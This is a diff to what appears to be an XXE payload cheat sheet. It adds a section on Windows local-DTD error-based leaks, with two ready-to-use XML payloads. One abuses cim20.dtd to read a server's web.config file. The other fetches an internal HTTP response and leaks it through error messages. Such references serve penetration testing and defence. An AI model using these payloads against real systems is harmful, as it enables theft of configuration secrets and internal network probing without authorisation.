@@ -26,6 +26,7 @@ Syntax: `<!ENTITY entity_name SYSTEM "entity_value">`
   - [XXE OOB Attack (Yunusov, 2013)](#xxe-oob-attack-yusonov---2013)
   - [XXE OOB with DTD and PHP filter](#xxe-oob-with-dtd-and-php-filter)
   - [XXE OOB with Apache Karaf](#xxe-oob-with-apache-karaf)
+- [Windows Local DTD and Side Channel Leak to disclose HTTP response/file contents](#windows-local-dtd-and-side-channel-leak-to-disclose-http-responsefile-contents)
 - [XXE in exotic files](#xxe-in-exotic-files)
   - [XXE inside SVG](#xxe-inside-svg)
   - [XXE inside SOAP](#xxe-inside-soap)
@@ -250,6 +251,9 @@ i: &i [*h,*h,*h,*h,*h,*h,*h,*h,*h]
 ```
 
 
+
+
+
 ## Exploiting blind XXE to exfiltrate data out-of-band
 
 Sometimes you won't have a result outputted in the page but you can still extract the data with an out of band attack.
@@ -371,6 +375,43 @@ Assuming payloads such as the previous return a verbose error. You can start poi
 
 [Other payloads using different DTDs](https://github.com/GoSecure/dtd-finder/blob/master/list/xxe_payloads.md)
 
+
+
+## Windows Local DTD and Side Channel Leak to disclose HTTP response/file contents
+
+From https://gist.github.com/infosec-au/2c60dc493053ead1af42de1ca3bdcc79
+
+### Disclose local file
+
+```xml
+<!DOCTYPE doc [
+    <!ENTITY % local_dtd SYSTEM "file:///C:\Windows\System32\wbem\xml\cim20.dtd">
+    <!ENTITY % SuperClass '>
+        <!ENTITY &#x25; file SYSTEM "file://D:\webserv2\services\web.config">
+        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file://t/#&#x25;file;&#x27;>">
+        &#x25;eval;
+        &#x25;error;
+      <!ENTITY test "test"'
+    >
+    %local_dtd;
+  ]><xxx>cacat</xxx>
+```
+
+### Disclose HTTP Response:
+
+```xml
+<!DOCTYPE doc [
+    <!ENTITY % local_dtd SYSTEM "file:///C:\Windows\System32\wbem\xml\cim20.dtd">
+    <!ENTITY % SuperClass '>
+        <!ENTITY &#x25; file SYSTEM "https://erp.company.com">
+        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file://test/#&#x25;file;&#x27;>">
+        &#x25;eval;
+        &#x25;error;
+      <!ENTITY test "test"'
+    >
+    %local_dtd;
+  ]><xxx>cacat</xxx>
+```
 
 ## XXE in exotic files
 
